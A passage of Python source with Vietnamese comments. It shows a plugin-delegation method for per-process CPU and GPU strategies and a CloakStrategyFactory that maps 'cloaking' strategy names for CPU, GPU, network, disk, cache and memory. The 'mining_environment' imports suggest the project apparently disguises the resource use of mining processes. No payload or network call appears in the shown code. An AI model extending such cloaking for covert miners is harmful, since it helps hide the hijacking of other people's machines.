                                    self.logger.info(f"✅ Applied CPU plugin: {plugin.__class__.__name__} for PID={process.pid}")
                                except Exception as plugin_error:
                                    self.logger.error(f"❌ Lỗi khi áp dụng CPU plugin {plugin.__class__.__name__}: {plugin_error}")
                                    continue
                    else:
                        self.logger.warning("⚠️ CPU manager không có plugins hoặc plugins list rỗng")
                    
                    # Fallback: Apply strategy trực tiếp nếu không có plugins
                    if plugins_applied == 0:
                        self.logger.warning("⚠️ Không có CPU plugins nào được áp dụng, fallback to direct strategy execution")
                        strategy.apply(process)
                        plugins_applied = 1
                    
                    self.logger.info(f"✅ Đã ủy quyền chiến lược CPU cho plugin system, PID={process.pid} ({plugins_applied} plugins applied)")
                    return True
                    
                except Exception as e:
                    self.logger.error(f"❌ Lỗi trong CPU plugin delegation: {e}")
                    # Fallback to direct execution
                    self.logger.warning("⚠️ Fallback to direct CPU strategy execution")
                    strategy.apply(process)
                    return True
                
            # GPU plugin delegation
            elif strategy_type == StrategyType.GPU:
                gpu_manager = self.resource_managers.get('gpu')
                if not gpu_manager:
                    self.logger.error("❌ Không tìm thấy GPU resource manager")
                    return False
                
                # Import gpu_plugins system
                try:
                    from mining_environment.gpu_plugins import apply_gpu_strategies
                    
                    # Apply GPU strategies thông qua plugin system
                    success = apply_gpu_strategies(process.pid, strategies=None)
                    if success:
                        self.logger.info(f"✅ Đã ủy quyền chiến lược GPU cho plugin system, PID={process.pid}")
                        return True
                    else:
                        self.logger.error(f"❌ GPU plugin delegation thất bại cho PID={process.pid}")
                        return False
                        
                except ImportError as e:
                    self.logger.error(f"❌ Không thể import GPU plugins: {e}")
                    # Fallback to direct execution
                    self.logger.warning("⚠️ Fallback to direct GPU strategy execution")
                    strategy.apply(process)
                    return True
                    
                except Exception as e:
                    self.logger.error(f"❌ Lỗi GPU plugin delegation: {e}")
                    return False
            
            self.logger.warning(f"⚠️ Không hỗ trợ ủy quyền cho plugin system với chiến lược {strategy_type}")
            return False
            
        except Exception as e:
            self.logger.error(f"❌ Lỗi khi ủy quyền chiến lược {strategy_type} cho plugin system: {e}")
            return False

###############################################################################
#                          BACKWARD COMPATIBILITY                             #
###############################################################################

class CloakStrategyFactory:
    """
    Wrapper factory để đảm bảo tương thích ngược với codebase hiện tại.
    Thực ra chỉ là proxy đến ResourceCoordinator theo blueprint.
    """
    
    _coordinator_instances = {}
    
    @staticmethod
    def create_strategy(
        strategy_name: str,
        config: Dict[str, Any],
        logger: logging.Logger,
        resource_managers: Dict[str, Any],
        process_type: str = None,
        strategy_hints: Dict[str, Any] = None
        ) -> Optional[Any]:
        """
        ✅ ENHANCED: Tạo type-aware strategy instance với pre-configuration.
        
        :param strategy_name: Tên chiến lược
        :param config: Cấu hình
        :param logger: Logger
        :param resource_managers: Resource managers
        :param process_type: 'CPU' hoặc 'GPU' process type cho optimization
        :param strategy_hints: Optional optimization hints
        :return: Pre-configured strategy instance hoặc None
        """
        # Tạo hoặc lấy ResourceCoordinator instance
        coordinator_key = id(config)
        if coordinator_key not in CloakStrategyFactory._coordinator_instances:
            coordinator = ResourceCoordinator(config, logger)
            CloakStrategyFactory._coordinator_instances[coordinator_key] = coordinator
        else:
            coordinator = CloakStrategyFactory._coordinator_instances[coordinator_key]
        
        # Import StrategyType
        from .cloak_strategies import StrategyType
        
        # ✅ ENHANCED: Map strategy name cũ sang StrategyType mới cho comprehensive cloaking
        strategy_mapping = {
            'cpu': StrategyType.CPU,
            'gpu': StrategyType.GPU,
            'network': StrategyType.NETWORK,
            'disk_io': StrategyType.DISK_IO,
            'cache': StrategyType.CACHE,
            'memory': StrategyType.MEMORY,
            # ✅ REMOVED: 'thermal_control' - unified vào GpuCloakStrategy
            'cpu_cloaking': StrategyType.CPU,
            'gpu_cloaking': StrategyType.GPU,
            'network_cloaking': StrategyType.NETWORK,
            'disk_io_cloaking': StrategyType.DISK_IO,
            'cache_cloaking': StrategyType.CACHE,
            'memory_cloaking': StrategyType.MEMORY,
            # ✅ REMOVED: 'thermal_cloaking' - unified vào GpuCloakStrategy
        }
        
        if strategy_name in strategy_mapping:
            mapped_name = strategy_mapping[strategy_name]
            strategy = coordinator.strategies.get(mapped_name)
        else:
            # Thử tìm trực tiếp
            strategy = coordinator.strategies.get(strategy_name)
        
        # ✅ TYPE-AWARE CONFIGURATION
        if strategy and process_type:
            try:
                # Pre-configure strategy nếu support type-aware config
                if hasattr(strategy, 'configure_for_process_type'):
                    strategy.configure_for_process_type(process_type, strategy_hints)
                    logger.info(f"🎯 [Factory] Strategy '{strategy_name}' pre-configured for {process_type}")
                else:
                    logger.debug(f"⚠️ [Factory] Strategy '{strategy_name}' doesn't support type-aware config")
            except Exception as e:
                logger.error(f"❌ [Factory] Failed to configure strategy '{strategy_name}': {e}")
        
        return strategy
    
    @staticmethod
    def get_available_strategies() -> List[str]:
        """
        Lấy danh sách 6 unified strategies có sẵn cho tương thích ngược.
        Thermal management được integrate trong GPU strategy.
        
        :return: List các strategy names (6 strategies)
        """
        from .cloak_strategies import StrategyType
        
        return [
            StrategyType.CPU,
            StrategyType.GPU,
            StrategyType.NETWORK,
            StrategyType.DISK_IO,
            StrategyType.CACHE,
            StrategyType.MEMORY
        ]
